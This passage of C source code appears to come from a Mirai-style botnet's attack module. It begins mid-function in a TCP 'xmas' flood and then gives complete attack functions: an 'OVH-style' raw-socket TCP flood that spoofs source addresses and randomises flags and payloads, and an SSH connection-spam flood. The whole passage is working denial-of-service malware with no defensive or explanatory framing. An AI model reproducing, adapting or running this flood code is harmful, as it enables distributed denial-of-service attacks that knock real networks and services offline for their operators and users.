                else if (tcph_recv->fin || tcph_recv->rst)
                {
                    close(fd);
                    goto xmas_setup_nums;
                }
            }
            if (time(NULL) - start_recv > 10)
            {
                close(fd);
                goto xmas_setup_nums;
            }
        }
    }

    int loop_counter = 0;
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            char *data = (char *)(tcph + 1);

            if (ip_ident == 0xffff)
                iph->id = fast_rand() & 0xffff;

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

            for (int b = 0; b < 3; b++)
            {
                tcph->seq = htonl(xmas_data[i].seq++);
                tcph->ack_seq = htonl(xmas_data[i].ack_seq);
                tcph->check = 0;
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + data_len), sizeof(struct tcphdr) + data_len);

                targs[i].sock_addr.sin_port = tcph->dest;
                sendto(rfd, pkt, sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len,
                       MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
            }
        }
        
        if (++loop_counter >= 300) {
            sched_yield();
            loop_counter = 0;
        }
    }
}

// ==================== TCP OVH (OVH STYLE) ====================
void attack_tcpovh(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof(char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 54321);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, 0xffffffff);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 0);

    init_random_pool();

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
        return;

    int hincl = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(int));

    for (i = 0; i < targs_len; i++)
    {
        int payload_len = 725 + (fast_rand() % (1000 - 725 + 1));
        pkts[i] = calloc(1, sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len);
        struct iphdr *iph = (struct iphdr *)pkts[i];
        struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
        unsigned char *payload = (unsigned char *)(tcph + 1);

        fast_rand_str((char *)payload, payload_len);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        iph->protocol = IPPROTO_TCP;
        iph->saddr = (source_ip == 0xffffffff) ? fast_rand_next() : source_ip;
        iph->daddr = targs[i].addr;

        tcph->source = htons(45000 + (fast_rand() % (64932 - 45000)));
        tcph->dest = htons(dport == 0xffff ? (fast_rand() % 65535) : dport);
        tcph->seq = htonl(fast_rand_next());
        tcph->ack_seq = htonl(fast_rand_next());
        tcph->doff = 5;
        
        uint8_t flags = fast_rand_flag();
        tcph->urg = (flags & TH_URG) ? 1 : 0;
        tcph->ack = (flags & TH_ACK) ? 1 : 0;
        tcph->psh = (flags & TH_PUSH) ? 1 : 0;
        tcph->fin = (flags & TH_FIN) ? 1 : 0;
        tcph->rst = (flags & TH_RST) ? 1 : 0;
        tcph->syn = (flags & TH_SYN) ? 1 : 0;
        
        tcph->window = htons(1024 + (fast_rand() % 4096));
    }

    unsigned int packetcounter = 0;
    int loop_counter = 0;
    int random_rotate = 0;
    
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            struct iphdr *iph = (struct iphdr *)pkts[i];
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            unsigned char *payload = (unsigned char *)(tcph + 1);

            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (fast_rand() >> targs[i].netmask));

            if (source_ip == 0xffffffff)
                iph->saddr = fast_rand_next();

            if (packetcounter > 1000)
            {
                // temporary FIN packet
                tcph->fin = 1;
                tcph->ack = 1;
                iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
                iph->id = htons(fast_rand() & 0xffff);
                tcph->seq = htonl(fast_rand_next());
                tcph->ack_seq = htonl(fast_rand_next());
                tcph->source = htons(45000 + (fast_rand() % (64932 - 45000)));
                tcph->check = 0;
                tcph->check = checksum_tcpudp(iph, tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
                iph->check = 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
                sendto(fd, pkts[i], sizeof(struct iphdr) + sizeof(struct tcphdr), MSG_NOSIGNAL,
                       (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
                // restore base
                tcph->fin = 0;
                iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + (ntohs(iph->tot_len) - sizeof(struct iphdr) - sizeof(struct tcphdr)));
                packetcounter = 0;
                usleep(1000);
            }

            tcph->seq = htonl(fast_rand_next());
            tcph->ack_seq = htonl(fast_rand_next());
            tcph->source = htons(45000 + (fast_rand() % (64932 - 45000)));
            
            uint8_t flags = fast_rand_flag();
            tcph->urg = (flags & TH_URG) ? 1 : 0;
            tcph->ack = (flags & TH_ACK) ? 1 : 0;
            tcph->psh = (flags & TH_PUSH) ? 1 : 0;
            tcph->fin = (flags & TH_FIN) ? 1 : 0;
            tcph->rst = (flags & TH_RST) ? 1 : 0;
            tcph->syn = (flags & TH_SYN) ? 1 : 0;
            
            if ((++random_rotate % 100 == 0)) {
                fast_rand_str((char *)payload, ntohs(iph->tot_len) - sizeof(struct iphdr) - sizeof(struct tcphdr));
            }

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, ntohs(iph->tot_len) - sizeof(struct iphdr), sizeof(struct tcphdr));

            sendto(fd, pkts[i], ntohs(iph->tot_len), MSG_NOSIGNAL,
                   (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
        }
        packetcounter++;
        
        if (++loop_counter >= 300) {
            sched_yield();
            loop_counter = 0;
        }
    }
}

// ==================== SSH (CONNECTION SPAM) ====================
void attack_ssh(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i;
    int conns = attack_get_opt_int(opts_len, opts, ATK_OPT_CONNS, 200);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 22);

    init_random_pool();

    int loop_counter = 0;
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            int j;
            for (j = 0; j < conns; j++)
            {
                int sock = socket(AF_INET, SOCK_STREAM, 0);
                if (sock == -1)
                    continue;

                struct sockaddr_in server;
                server.sin_family = AF_INET;
                server.sin_port = htons(dport);
                server.sin_addr.s_addr = (targs[i].netmask < 32)
                    ? htonl(ntohl(targs[i].addr) + (fast_rand() >> targs[i].netmask))
                    : targs[i].addr;

                connect(sock, (struct sockaddr *)&server, sizeof(server));
                close(sock);
            }
        }
        
        if (++loop_counter >= 100) {
            usleep(50);
            loop_counter = 0;
        }
    }
}

// ==================== HELPER FUNCTIONS ====================
static inline void fast_rand_str(char *buf, int len) {
    int offset = fast_rand() % (sizeof(random_pool) - len);
    memcpy(buf, random_pool + offset, len);
}